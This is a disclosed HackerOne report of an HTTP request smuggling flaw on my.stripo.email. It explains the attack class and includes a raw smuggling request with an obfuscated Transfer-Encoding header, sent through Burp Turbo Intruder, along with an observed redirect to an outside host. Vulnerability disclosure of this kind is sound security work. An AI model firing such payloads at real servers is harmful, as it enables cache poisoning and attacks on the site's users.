# HTTP Request Smuggling on my.stripo.email

## Report Details
- **Report ID**: 777651
- **URL**: https://hackerone.com/reports/777651
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-01-18T22:11:41.539Z
- **Disclosed**: 2020-04-10T07:54:00.219Z

## Reporter
- **Username**: codeslayer1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
## Summary:
HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

## Steps To Reproduce:
I use BurpSuite with the help of the HTTP Smuggler Request plugin to provide POC
1.Run the burp suite turbo intruder on the following request
POST /?aeRg=2056729135 HTTP/1.1
Host: my.stripo.email
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding : chunked
Content-Len%s keep-alive

f
ubvhq=x&e3t5b=x
0


2.The script for the turbo intruder is attached with the name poc.txt
3.301 object responses OK for the post request needed to provide a header response to Location: https://codeslayer137.000webhostapp.com/indeks. php Please see the attached screenshot. (2.png).

## Impact

Impact
an attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

Best regards

CodeSlayer13

## Attachments
- 1.png
- 2.png
- script.txt
